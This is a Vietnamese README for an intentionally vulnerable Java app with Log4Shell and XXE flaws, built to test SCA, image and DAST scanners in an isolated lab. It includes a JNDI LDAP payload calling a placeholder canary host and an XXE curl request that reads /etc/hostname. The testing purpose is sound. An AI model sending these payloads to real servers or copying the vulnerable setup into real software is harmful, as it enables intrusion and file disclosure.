# Vuln Java App — Log4Shell + XXE

Ứng dụng Java **cố ý chứa lỗ hổng** để test SCA/DAST scanner.

> ⚠️ CẢNH BÁO: Chỉ chạy trong môi trường cô lập (VM/network riêng, không public ra internet). Log4Shell là lỗ hổng RCE nghiêm trọng.

## 1. Build & chạy

```bash
cd vuln-java-app
docker build -t vuln-java-app:latest .
docker run --rm -p 8080:8080 vuln-java-app:latest
```

## 2. Lỗ hổng có trong image

| CVE / CWE | Mô tả | Vị trí |
|---|---|---|
| **CVE-2021-44228** (Log4Shell) | log4j-core/log4j-api 2.14.1, input log trực tiếp không sanitize | `GET /api/log?input=...` hoặc header `X-Api-Version` |
| **CVE-2021-45046** | Bản vá không đầy đủ của Log4Shell (log4j 2.15.0), cũng áp dụng vì version < 2.16.0 | cùng file `pom.xml` |
| **CWE-611 (XXE)** | `DocumentBuilderFactory` không tắt DOCTYPE/external entity | `POST /api/xxe` |
| Xerces 2.11.0 cũ | Thêm 1 dependency Java XML cũ có advisory riêng để test SCA | `pom.xml` |
| Base image `openjdk:8u191-jre` | JRE 8 cũ → nhiều CVE tầng OS/runtime cho Trivy/Grype/Docker Scout quét | `Dockerfile` |

## 3. Test cho từng loại scanner

### SCA (Software Composition Analysis)
```bash
# Quét source trước khi build image
trivy fs . 
grype dir:.
mvn dependency-check:check   # nếu có OWASP dependency-check plugin
```
Scanner phải phát hiện được `log4j-core 2.14.1` là CVE-2021-44228 / CVE-2021-45046 (Critical).

### Image scan
```bash
trivy image <repo>/vuln-java-app:latest
docker scout cves <repo>/vuln-java-app:latest
```

### DAST — kiểm tra Log4Shell (an toàn, không cần RCE thật)
Cách phổ biến các scanner thương mại dùng là kỹ thuật out-of-band (OOB): gửi payload
`${jndi:ldap://<canary-subdomain>.oob-provider.com/a}` vào request, rồi kiểm tra xem
server đích có thực hiện DNS/LDAP callback ra ngoài hay không (dùng dịch vụ như
Burp Collaborator, interactsh, hoặc canary domain tự host). Đây là cách kiểm chứng
lỗ hổng tồn tại mà **không cần dựng LDAP server độc hại để khai thác RCE thật** —
phù hợp để test khả năng phát hiện của scanner mà không tạo rủi ro.

Ví dụ (thay `<canary>` bằng domain callback của bạn):
```bash
curl "http://localhost:8080/api/log?input=\${jndi:ldap://<canary>.example.com/a}"
```
Nếu sản phẩm scan của bạn cần verify khai thác thực sự (không chỉ OOB callback),
đó là một luồng nghiệp vụ (redteam/pentest) riêng và cần dựng LDAP/RMI server có
kiểm soát trong lab cô lập — nên tách hẳn khỏi image test tự động này.

### XXE
```bash
curl -X POST http://localhost:8080/api/xxe \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<root>&x;</root>'
```
Nếu response trả về nội dung file `/etc/hostname` bên trong container, tức parser
đã bị khai thác XXE thành công — dùng để test khả năng DAST/SAST phát hiện.

## 4. Đẩy lên Docker Hub

```bash
docker login
docker tag vuln-java-app:latest <docker-hub-username>/vuln-java-app:latest
docker push <docker-hub-username>/vuln-java-app:latest
```
